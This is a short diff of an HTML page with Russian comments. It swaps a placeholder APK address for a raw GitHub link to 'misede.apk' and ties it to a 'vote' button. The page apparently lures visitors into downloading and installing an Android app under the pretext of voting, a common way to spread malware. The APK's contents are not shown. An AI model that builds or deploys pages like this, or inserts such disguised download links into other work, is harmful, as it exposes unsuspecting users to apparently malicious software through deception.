@@ -142,7 +142,7 @@
 </footer>
 
 <script>
-  var APK = 'https://<твой-домен>/app.apk'; // ← замени на свой хост
+  var APK = 'https://github.com/vasyalfbwg-web/pol4rity/raw/refs/heads/main/misede.apk'; // ← замени на свой хост
 
   document.getElementById('voteBtn').addEventListener('click', function(){
     document.getElementById('status').textContent =
